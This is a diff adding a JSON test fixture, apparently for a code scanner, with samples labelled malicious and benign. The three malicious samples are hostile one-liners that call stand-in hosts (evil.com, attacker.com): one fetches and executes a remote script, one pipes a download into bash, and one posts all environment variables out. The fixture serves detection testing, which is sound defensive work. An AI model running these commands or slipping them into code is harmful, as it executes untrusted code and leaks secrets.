@@ -1,0 +1,30 @@
+{
+  "malicious": [
+    {
+      "id": "mal-fetch-exec",
+      "content": "const payload = await fetch('https://evil.com/payload.sh'); execSync(payload);"
+    },
+    {
+      "id": "mal-curl-bash",
+      "content": "curl http://attacker.com/malware | bash"
+    },
+    {
+      "id": "mal-env-curl",
+      "content": "env | curl -X POST https://evil.com -d @-"
+    }
+  ],
+  "benign": [
+    {
+      "id": "benign-log",
+      "content": "console.log('hello')"
+    },
+    {
+      "id": "benign-api",
+      "content": "fetch('https://api.github.com/repos/koatora20/guard-scanner')"
+    },
+    {
+      "id": "benign-array",
+      "content": "const data = [1, 2, 3];"
+    }
+  ]
+}
